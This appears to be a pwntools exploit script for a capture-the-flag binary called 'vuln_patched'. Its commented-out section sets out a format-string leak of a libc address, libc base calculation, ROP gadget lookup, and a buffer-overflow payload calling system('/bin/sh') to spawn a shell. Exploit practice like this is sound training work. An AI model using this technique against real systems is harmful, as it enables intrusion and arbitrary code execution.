#!/usr/bin/env python3

from pwn import *

TARGET = './vuln_patched'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  # context.terminal = ['tmux', 'splitw', '-h']  
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

# EPXLOIT

p.recvuntil(b'What do you ')
# parse = p.recv(4).strip()
parse = p.recv(4).decode()
print(f"parse res: {parse}")


# p.sendline(b'%17$p')

# p.recvuntil(b'want? Lmao not giving you ')
# leak = int(p.recvline()[:-1].strip(), 16)
# print(f"leak : {hex(leak)}")

# libc.address = leak - 0x2724a
# system = libc.sym.system
# binsh = next(libc.search(b'/bin/sh'))
# print(f"libc base : {hex(libc.address)}")

# rop = ROP(libc)
# ret = rop.find_gadget(['ret'])[0]
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# print(hex(ret))
# print(hex(pop_rdi))

# payload = b'A' * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
# p.sendline(payload)


p.interactive()

# NOTE:
#
